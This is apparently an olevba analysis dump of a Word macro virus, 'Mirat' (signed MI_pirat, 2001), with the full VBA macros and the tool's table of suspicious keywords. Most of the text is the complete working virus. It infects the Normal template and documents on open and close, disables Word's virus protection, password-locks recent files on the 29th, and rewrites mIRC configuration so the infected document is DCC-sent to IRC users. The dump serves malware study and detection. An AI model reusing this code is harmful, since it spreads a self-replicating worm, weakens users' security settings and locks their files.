olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mirat-4850aa241150aad43c91b21927912bb0e30ddcb7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mirat-4850aa241150aad43c91b21927912bb0e30ddcb7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Macroz.bas 
in file: Virus.MSWord.Mirat-4850aa241150aad43c91b21927912bb0e30ddcb7 - OLE stream: 'Macros/VBA/Macroz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Activates an object"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.ActivateObject"
' CiTeStE.Ma! by MI_pirat (C) 2001 Romania
' mIRC Worm 'n' Stuff
zi = Day(Date)
If zi = 29 Then Call Macro2
If zi = 29 Then
nr = 1
Do While nr <= RecentFiles.Count
nr = nr + 1
RecentFiles(nr).Open
RecentFiles(nr).Open.Password = "dork"
RecentFiles(nr).Open.Save
RecentFiles(nr).Open.Close
Loop
End If
Set fs = Application.FileSearch
With fs
    .LookIn = "C:\"
    .FileName = "netwin.txt"
    If .Execute(SortBy:=msoSortByFileName, _
    SortOrder:=msoSortOrderAscending) > 0 Then
    StatusBar = "..."
    Else
    Call NoSec
    Set myTemplate = NormalTemplate
    Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        myTemplate.FullName, Name:= _
        "Macroz", Object:=wdOrganizerObjectProjectItems
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly _
        :=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate _
        :="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="" _
        , Format:=wdOpenFormatAuto
ActiveDocument.Save
ActiveDocument.Close
Call FileCopy("C:\autoexec.bat", "C:\netwin.txt")
nume = ActiveDocument.FullName
myDir = Dir("C:\mirc*", vbDirectory)
Do While myDir <> ""
ActiveDocument.SaveAs FileName:="C:\" + myDir + "\" + "mIRCstuf.doc"
ActiveDocument.SaveAs FileName:=nume
Call Kill("C:\" + myDir + "\aliases.ini")
Open "C:\" + myDir + "\aliases.ini" For Output As #1
Print #1, "[aliases]"
Print #1, "n0=/op /load -rs mircs.ini | /mode +ooo $$1 $2 $3"
Print #1, "n1=/dop /mode # -ooo $$1 $2 $3"
Print #1, "n2=/j /load -rs mIRCs.ini | /join #"
Print #1, "n3=/p /part #"
Print #1, "n4=/n /names #$$1"
Print #1, "n5=/w /whois $$1"
Print #1, "n6=/k /load -rs mircs.ini | /kick # $$1"
Print #1, "n7=/q /load -rs mircs.ini | /query $$1"
Print #1, "n8=/hop /part # | /join #$$1"
Print #1, "n9=/send /dcc send $1 mIRCstuf.doc"
Print #1, "n10=/chat /dcc chat $1"
Print #1, "n11=/ping /ctcp $$1 ping"
Close #1
Open "C:\" + myDir + "\" + "mirc.ini" For Append As #1
Print #1, "[Perform]"
Print #1, "n0=/load -rs mIRCs.ini"
Close #1
Open "C:\" + myDir + "\" + "mIRCs.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#:{"
Print #1, "n1=/query $nick mIRCstuf.doc ,all about mIRC !"
Print #1, "n2=/send $nick mIRCstuf.doc"
Print #1, "n3=}"
Print #1, "n4=on 1:PART:#:{"
Print #1, "n5=/query $nick mIRCstuf.doc ,all about mIRC"
Print #1, "n6=/send $nick mIRCstuf.doc"
Print #1, "n7=}"
Print #1, "n8=on @1:text:*hy*:#:/kick $chan $nick"
Print #1, "n9=on @1:text:*sal*:#:/kick $chan $nick"
Print #1, "n10=on 1:text:*bye*:#:/quit I'm really Fucked Up Now...Gotta Go Suckerz!"
Print #1, "n11=on 1:op:#:/disconnect"
Print #1, "n12=on 1:deop:#:/query $nick Fuck You :)"
Close #1
myDir = Dir
Loop
End If
End With
End Sub
Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro recorded 01/27/01 by MI_pirat"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.Macro1"
' MacroVirus made by MI_pirat
' Get It While It's Hot
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Infect" Then num = aVar.Index
Next aVar
If num = 0 And NormalTemplate.FullName <> ActiveDocument.FullName Then
ActiveDocument.Variables.Add Name:="Infect"
ActiveDocument.Variables("Infect").Value = 1
Set myTemplate = NormalTemplate
Application.OrganizerCopy Source:= _
   myTemplate.FullName, Destination:= _
   ActiveDocument.FullName, Name:="Macroz", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
   End Sub
Sub Macro2()
Attribute Macro2.VB_Description = "Macro recorded 01/27/01 by MI_pirat"
Attribute Macro2.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.Macro2"
' Macro2 Macro (stupid macro, isn't it? )
' Macro made MI_pirat
StatusBar = "MY FIRST MACROVIRUS: CiTeStE.Ma! COOL ISN'T IT ?¿"
hya = MsgBox("MI_pirat is happy to see u", vbCritical, "ViSiT www.ltl.4t.com")
raspuns = MsgBox("R U a Lamer?¿", vbYesNo, "Hya lamer...")
If raspuns = vbYes Then
MsgBox "Then you don't mind my Format C: ..."
Else
MsgBox "What ever..."
End If
End Sub
Sub NoSec()
Attribute NoSec.VB_Description = "Macro recorded 01/28/01 by MI_pirat"
Attribute NoSec.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.NoSec"
' NoSecurity Macro (cuz securty is bad 4 ya)
' Macro made 01/28/01 by MI_pirat
' The World Sucks It Down :)
     With Options
        .ConfirmConversions = False
        .UpdateLinksAtOpen = True
        .SendMailAttach = True
        .VirusProtection = False
        .AllowFastSave = True
        .BackgroundSave = True
        .CreateBackup = False
        .SavePropertiesPrompt = False
        .SaveInterval = 10
        .SaveNormalPrompt = False
    End With
     With ActiveDocument
        .ReadOnlyRecommended = False
        .SaveFormsData = False
     End With
    Application.DefaultSaveFormat = ""
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
